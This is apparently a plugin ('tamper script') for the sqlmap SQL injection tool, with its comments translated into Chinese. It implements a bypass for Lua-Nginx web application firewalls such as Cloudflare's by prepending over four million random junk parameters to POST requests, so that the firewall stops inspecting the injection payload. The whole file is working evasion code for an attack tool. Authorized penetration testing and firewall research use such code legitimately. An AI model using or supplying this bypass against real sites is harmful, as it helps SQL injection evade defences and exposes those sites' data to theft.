#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import string
import os

from lib.core.compat import xrange
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import HINT
from lib.core.enums import PRIORITY
from lib.core.settings import DEFAULT_GET_POST_DELIMITER

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅在 POST 请求上运行' % (os.path.basename(__file__).split(".")[0]))

def tamper(payload, **kwargs):
    '\n    LUA-Nginx WAF 绕过（例如 Cloudflare），具有 420 万个参数\n\n    Reference:\n        * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/\n\n    Notes:\n        * Lua-Nginx WAF不支持大量参数的处理\n    '

    hints = kwargs.get("hints", {})
    delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)

    hints[HINT.PREPEND] = delimiter.join("%s=" % "".join(random.sample(string.ascii_letters + string.digits, 2)) for _ in xrange(4194304))

    return payload
